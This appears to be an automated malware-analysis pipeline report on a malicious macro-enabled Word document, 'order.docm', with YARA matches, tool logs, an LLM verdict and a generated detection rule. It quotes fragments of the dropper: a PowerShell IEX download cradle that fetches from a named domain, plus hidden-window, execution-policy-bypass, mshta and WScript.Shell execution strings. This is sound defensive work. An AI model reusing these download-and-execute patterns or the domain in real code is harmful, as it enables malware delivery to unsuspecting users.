| checklist_ok_flag | `True` |
| agentic_confidence_sane | `True` |

### Tools (full evidence excerpts)

#### `malcat` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `capa` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `pe_imports` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `yara` — ok=`True` why=`ok`

```json
{
  "rule_count": 6,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$ipv6",
          "offset": 7394,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "docx_macro",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$header",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$vbaStrings",
          "offset": 8137,
          "length": 19,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$a",
          "offset": 471,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Contains_VBA_macro_code",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$zipmagic",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$xmlstr1",
          "offset": 8142,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$xmlstr2",
          "offset": 7531,
          "length": 11,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "office_document_vba",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$zipmagic",
          "offset": 0,
          "length": 2,
          "xor_key": null
        },
        {
          "id": "$xmlstr1",
          "offset": 8142,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$xmlstr2",
          "offset": 7531,
          "length": 11,
          "xor_key": null
        }
      ]
    }
  ],
  "engine": "yara-x",
  "rules_compiled": 454,
  "compile_errors": [
    "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
    "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
    "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import
… [1672 more chars]
```

#### `floss` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `dotnet` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `r2_decomp` — ok=`True` why=`ok`

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "disassembly": {
    "0x00000000": "\u250c 94: fcn.00000000 (int64_t arg1, int64_t arg4);\n\u2502           ; arg int64_t arg1 @ rdi\n\u2502           ; arg int64_t arg4 @ rcx\n\u2502           0x00000000      50             push rax\n\u2502           0x00000001      4b030414       add rax, qword [r12 + r10]\n\u2502           0x00000005      0000           add byte [rax], al\n\u2502           0x00000007      0008           add byte [rax], cl\n\u2502           0x00000009      0000           add byte [rax], al\n\u2502           0x0000000b      0021           add byte [rcx], ah          ; arg4\n\u2502           0x0000000d      005bc3         add byte [rbx - 0x3d], bl\n\u2502           0x00000010      0c0c           or al, 0xc\n\u2502           0x00000012      8801           mov byte [rcx], al          ; arg4\n\u2502       \u254e   0x00000014      0000           add byte [rax], al\n\u2502      \u250c\u2500\u2500< 0x00000016      e105           loope 0x1d\n\u2502      \u2502\u254e   0x00000018      0000           add byte [rax], al\n\u2502      \u2502\u254e   0x0000001a      1300           adc eax, dword [rax]\n\u2502      \u2502\u254e   0x0000001c  ~   0000           add byte [rax], al\n\u2502      \u2514\u2500\u2500> 0x0000001d      005b43         add byte [rbx + 0x43], bl\n\u2502       \u254e   0x00000020      6f             outsd dx, dword [rsi]\n\u2502       \u254e   0x00000021      6e             outsb dx, byte [rsi]\n\u2502      \u250c\u2500\u2500< 0x00000022      7465           je 0x89\n\u2502      \u2502\u254e   0x00000024      6e             outsb dx, byte [rsi]\n\u2502     \u250c\u2500\u2500\u2500< 0x00000025      745f           je 0x86\n\u2502     \u2502\u2502\u254e   0x00000027      54             push rsp\n\u2502    \u250c\u2500\u2500\u2500\u2500< 0x00000028      7970           jns 0x9a\n\u2502   \u250c\u2500\u2500\u2500\u2500\u2500< 0x0000002a      65735d         jae 0x8a\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x0000002d      2e786d         js 0x9d\n\u2502 \u2502\u254e\u2502\u2502\u2502\u2502\u254e   0x00000030      6c             insb byte [rdi], dx\n\u2502 \u2502\u254e\u2502\u2502\u2502\u2502\u254e   0x00000031      b554           mov ch, 0x54                ; 'T'\n\u2502 \u2502\u254e\u2502\u2502\u2502\u2502\u254e   0x00000033      4b4fc3         ret\n..\n  \u2502\u254e\u2502\u2502\u2502\u2502\u254e   ; DATA XREF from fcn.00000000 @ 0x31(r)\n\u2502 \u2502\u2502\u2502\u2502\u2514\u2500\u2500\u2500> 0x00000086      c5             invalid\n..\n\u2502 \u2502\u2502\u2502\u2502 \u2514\u2500\u2500> 0x00000089  ~   b8181d1e0c     mov eax, 0xc1e1d18          ; '\\x18\\x1d\\x1e\\f'\n\u2502 \u2502\u2502\u2514\u2500\u2500\u2500\u2500\u2500> 0x0000008a      181d1e0c272b   sbb byte [0x2b270cae], bl\n\u2502 \u2502\u2502 \u2502      0x00000090      8f             invalid\n..\n\u2502 \u2502\u2502 \u2514\u2500\u2500\u2500\u2500> 0x0000009a  ~   29a39aa38158   sub dword [rbx + 0x5881a39a], esp ; [0x5881a39a:4]=-1\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500> 0x0000009d      a38158388f..   movabs dword [0xbb52b968f385881], eax ; [0xbb52b968f385881:4]=-1\n\u2514       \u2502   0x000000a6      06             invalid"
  },
  "engine": "pdf (disasm)",
  "fallback": true,
  "functions_attempted": [
    "0x00000000"
  ]
}
```

#### `upx` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `xor` — ok=`True` why=`ok`

```json
{
  "xorsearch_ok": false,
  "sample": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "candidates": [],
  "xorsearch_stdout": "",
  "xorsearch_stderr": "",
  "xorsearch_returncode": 1
}
```

#### `speakeasy` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `frida_probe` — ok=`True` why=`not_applicable:ooxml`

```json

```

#### `frida_trace` — ok=`True` why=`not_applicable:ooxml`

```json

```

### LLM citation grounding

```json
{
  "ok": true,
  "checked": 8,
  "hits": 8,
  "misses": [],
  "hit_examples": [
    "Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech",
    "Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payl",
    "Malcat rData strings: 'mshta' LOLBin reference for stealthy execution",
    "Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)",
    "Malcat rData strings: multiple base64-encoded command strings"
  ],
  "reason": ""
}
```

### LLM / outcome preview

```json
{
  "source": "deep_dive_agentic",
  "confidence": 90,
  "summary": "Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execut",
  "key_evidence": [
    "Malcat rData strings: 'IEX (New-Object Net.WebClient).DownloadString(...)' download cradle from autonews.safeframe.tech",
    "Malcat rData strings: 'powershell -windowstyle hidden -ep bypass -enc ...' obfuscated hidden PowerShell with base64 payload",
    "Malcat rData strings: 'mshta' LOLBin reference for stealthy execution",
    "Malcat rData strings: 'WScript.Shell' Run with hidden window (value 0)",
    "Malcat rData strings: multiple base64-encoded command strings",
    "YARA matched rules: docx_macro, office_document_vba, Contains_VBA_macro_code, contains_base64, domain, IP",
    "Malcat structure: vbaProject.bin (4985 bytes) + vbaData.xml confirming active macro project",
    "File type .docm is macro-enabled Office document, requiring user to enable macros to trigger payload"
  ],
  "model": null,
  "llm_audit": null
}
```

### Agentic tool-call history (excerpts)

- **yara_scan** ok=`True` checklist=`True` — Required checklist tool (yara)

```json
{
  "rule_count": 6,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corp
… [4772 more chars]
```

- **malcat_analyze** ok=`True` checklist=`True` — Required checklist tool (malcat)

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "order.docm",
    "file_path": "/op
… [34161 more chars]
```

- **r2_decompile** ok=`True` checklist=`True` — Required checklist tool (r2_decomp)

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "disassembly": {
    "0x00000000": "\u250c 94: fcn.00000000 (int64_t arg1, int64_t arg4);\n\u2502           ; arg int64_t arg1 @ rdi\n\u2502           ; arg int64_t arg4 @ rcx\n\u2502           0x00000000      50             push rax\n\u2502           0x00000001  
… [3034 more chars]
```

- **xor_string_search** ok=`True` checklist=`True` — Required checklist tool (xor)

```json
{
  "xorsearch_ok": false,
  "sample": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "candidates": [],
  "xorsearch_stdout": "",
  "xorsearch_stderr": "",
  "xorsearch_returncode": 1
}
```

- **signal_extractors** ok=`False` checklist=`True` — Deterministic anti-analysis + dynamic-import-resolve signals + emulation oracle
  - error: `FileNotFoundError: session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)`

```json
{
  "anti_analysis_summary": {},
  "dynamic_resolve_summary": {},
  "emulation_oracle_ok": false,
  "emulation_oracle_error": "SpeakeasyError: Emulator not initialized",
  "executed_functions": 0,
  "dyn_import_count": null
}
```

- **ghidra_query** ok=`False` checklist=`False` — Auto SQL seed for large-mode deep RE gate
  - error: `session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)`

```json
{
  "error": "session doc-ooxml-385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73 has no gpr_path (intake_v2 should have set it)"
}
```

- **floss_extract** ok=`False` checklist=`False` — langgraph tool call
  - error: `FLOSS supports PE only (got ooxml)`

```json
{
  "skipped": true,
  "fail_open": true,
  "reason": "not_applicable:ooxml",
  "error": "FLOSS supports PE only (got ooxml)",
  "string_count": 0,
  "strings": [],
  "floss_profile": "skipped",
  "duration_s": 0.0
}
```

- **capa_analyze** ok=`False` checklist=`False` — langgraph tool call
  - error: `capa rc=16`

```json
{
  "error": "capa rc=16",
  "stderr": "elpers.py:277\n         output (-h).                                                           \nERROR    capa:  If you don't know the input file type,            helpers.py:278\nERROR    capa:  you can try using the `file` utility to guess it. helpers.py:279\nERROR    capa:                                                    helpers.py:280\n         --------
… [236 more chars]
```

- **malcat_analyze** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_name": "order.docm",
    "file_path": "/op
… [34161 more chars]
```

- **speakeasy_emulate** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "skipped": true,
  "reason": "not_applicable:ooxml"
}
```

- **yara_scan** ok=`True` checklist=`False` — langgraph tool call

```json
{
  "rule_count": 6,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/610/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/order.docm",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corp
… [4772 more chars]
```

### Artifact paths (verify on disk)

- **tools_raw:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/01-tools-raw.json` exists=`True` bytes=`47755` mtime=`2026-08-09T16:10:35.134577+00:00`
  - sha256: `37464f4d909ec63a0e3602fb342c915035eca9de72f35b63bec29a31c9394971`
- **sql_evidence:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/00-sql-evidence.json` exists=`False` bytes=`0` mtime=`None`
- **prompt:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/03-prompt.txt` exists=`False` bytes=`0` mtime=`None`
- **llm_raw:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/04-llm-raw.json` exists=`False` bytes=`0` mtime=`None`
- **deep05:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/05-deep-dive.json` exists=`True` bytes=`3215` mtime=`2026-08-09T16:12:12.526356+00:00`
  - sha256: `e7997caf6d6f2b07ebda004abd9954cc38369c4fbae43a0dbb45012cce31357e`

#### prompt_excerpt

```

```


#### llm_raw_excerpt

```
{}
```


#### deep05_excerpt

```
{
  "source": "deep_dive_agentic",
  "engine": "langgraph",
  "verdict": "malicious",
  "confidence": 90,
  "summary": "Macro-enabled Word document (.docm) containing a VBA payload that downloads and executes a remote PowerShell script from 'autonews.safeframe.tech' using IEX cradle, hidden PowerShell window, execution policy bypass, and base64-encoded commands. Uses mshta LOLBin and WScript.Shell for stealthy execution. Classic maldoc dropper behavior. Persistence: Not observed. Evasion_anti_analysis: Observed \u2013 hidden PowerShell window, execution policy bypass, base64-encoded commands, and use of mshta LOLBin for stealthy execution. {source: 'VBA Payload Analysis', query_or_table: 'PowerShell Execution Commands', row_or_rule: 'HiddenWindow=True, ExecutionPolicy Bypass, EncodedComman
… [2415 more chars]
```

- **agentic:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/deep_dive/agentic_deep_dive.json` exists=`True` bytes=`218426` mtime=`2026-08-09T16:12:12.526356+00:00`
  - sha256: `dd33589f36b6a9f931d2350a576eb082ea5787f395f3b929f26461f61a23b6d1`

---

## Stage: yara_gen

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| rule_yar | `True` |
| non_empty | `True` |
| has_rule_block | `True` |
| rule_compiles | `True` |
| rule_check | `ok` |
| meta_yara_valid | `True` |

### Artifact paths (verify on disk)

- **rule_yar:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/rule.yar` exists=`True` bytes=`1346` mtime=`2026-08-09T16:12:12.971355+00:00`
  - sha256: `e31983b223e25f32ff332a3108db29312fe62d7f34bba1e3a52fad72e5f563a0`

#### excerpt

```
// yara_gen_v2.py — 2026-08-09T16:12:12.971653+00:00
rule CADRE_v2_generic_macro_malware_385966f3d6be {
    meta:
        description = "RevAI v2 auto rule for generic macro malware"
        sha256 = "385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73"
        family = "generic_macro_malware"
        revai = true
        revai_commit = "unknown"
        revai_engine = "langgraph"
        severity = "high"
        confidence = "medium"
    strings:
        $s0 = "Rule matched indicating the presence of VBA macro code in the document, a common vector for malicious payloads." ascii wide
        $s1 = "Confirms the document contains VBA macro code, supporting the likelihood of executable content." ascii wide
        $s2 = "Base64 encoded strings detected, which may be used for ob
… [544 more chars]
```


---

## Stage: publish

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| REPORT_MASTER_v2 | `True` |
| REPORT_MASTER_v3 | `True` |
| REPORT_v2 | `True` |
| REPORT_TECHNICAL_v2 | `True` |
| REPORT_TECHNICAL_v3 | `True` |
| v2_min_chars | `True` |
| v3_min_chars | `True` |
| v2_heads | `True` |
| v3_heads | `True` |
| v2_fresh_vs_deep | `True` |
| v3_fresh_vs_deep | `True` |
| not_llm_env_failure_v2 | `True` |
| not_llm_env_failure_v3 | `True` |
| v2_no_missing_sections | `True` |
| verdict_lock_ok | `True` |
| quality_pack_ok | `True` |
| master_source_llm | `True` |
| tech2_source_llm | `True` |
| tech3_source_ok | `True` |
| tech2_no_stubs | `True` |
| no_tech2_fallback | `True` |
| quality_issues | `[]` |
| engine_citation_ok | `True` |

### Artifact paths (verify on disk)

- **REPORT_MASTER_v2:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-MASTER-v2.md` exists=`True` bytes=`14814` mtime=`2026-08-09T20:06:11.197619+00:00`
  - sha256: `96ad4245567414a3cff52b80ba9950e312d499332058d00c302ff2e6e7bcb9cc`
- **REPORT_MASTER_v3:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-MASTER-v3.md` exists=`True` bytes=`49727` mtime=`2026-08-09T20:16:33.060572+00:00`
  - sha256: `9389d57c88ae4b139e8185de6ec736a53714f738740d0029bd7eeeec65daa3b2`
- **REPORT_v2:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-v2.md` exists=`True` bytes=`14814` mtime=`2026-08-09T20:06:11.197619+00:00`
  - sha256: `96ad4245567414a3cff52b80ba9950e312d499332058d00c302ff2e6e7bcb9cc`
- **REPORT_TECHNICAL_v2:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-TECHNICAL-v2.md` exists=`True` bytes=`35776` mtime=`2026-08-09T20:08:49.872545+00:00`
  - sha256: `751a0f24cd4ed7887e1fb963e500922bc084811d83ff5557b757ce6ed8263a01`
- **REPORT_TECHNICAL_v3:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/REPORT-TECHNICAL-v3.md` exists=`True` bytes=`34854` mtime=`2026-08-09T20:19:11.480557+00:00`
  - sha256: `2d9e9ac5510c25d7f81b0d1a7cda4fa3ffb05215f6c18728a1c9a2f526cfc02b`
- **report_v2_json:** `/opt/samples/logs/385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73/report-v2.json` exists=`True` bytes=`17422` mtime=`2026-08-09T20:08:49.875544+00:00`
  - sha256: `6b37e0d5afc75aefaac6f47d19b69825c724a8e6753c717c792ef937cddd6cca`

#### v2_excerpt

```
> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-09 20:06:11 UTC

# Verdict sources (multi-source)

| Source | Verdict |
|--------|--------|
| **Final** | **malicious** |
| Triage upstream (quick ∪ deep) | malicious |
| Quick scan | suspicious |
| Deep dive | malicious |
| Publish LLM (claimed) | malicious |

- **Locked over publish LLM:** no

## Executive Summary

This report details the analysis of a macro-enabled Microsoft Word document (.docm) identified as a malicious dropper. The sample, SHA256 `385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73`, was submitted for analysis under the project `test-corpus`. Initial triage flagged the sample as suspicious due to the presence of VBA macros and network indicators. A deep-dive analysis confirmed the document co
… [13903 more chars]
```


#### v3_excerpt

```
> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-09 20:16:33 UTC

# RE Report — 385966f3d6be
_Generated 2026-08-09T20:16:33.059421+00:00_  
_Pipeline: section-based Map-Reduce, 3 pass-1 LLM calls + 14 pass-2 calls with cross-section context + 2 local sections_

<!-- section: Executive Summary | pass=2 | evidence=229c | cross_refs=True | llm_ok=True | runtime=58.14s -->

## Executive Summary

This section provides a top-line assessment of the malware sample with SHA256 385966f3d6be7b234a790e2dfa2573f1ab1bc72e78bce73bb479a11a54784c73. Based on evidence from deep analysis and automated tooling, we assess the sample as **malicious** with **high confidence**, belonging to the **generic macro malware** family.

| Aspect | Assessment | Confidence | Key Evidence Sources |
|--------|-
… [48810 more chars]
```


---

## Manual verification checklist (public showcase)

1. Open every **Artifact path** and confirm bytes/mtime/sha256 match this report.
2. For each tool: confirm raw excerpt matches on-disk JSON (`01-tools-raw.json`).
3. For each LLM stage: `key_evidence` strings appear in tool/SQL JSON (citation grounding).
4. Confirm REPORT-MASTER-v2 **and** REPORT-MASTER-v3 are fresh vs deep_dive mtime.
5. If capa salvaged: malcat `capa_summary` exists and LLM cited it.
6. Showcase pack under `/opt/samples/logs/_showcase_audits/<sha>/` is complete.
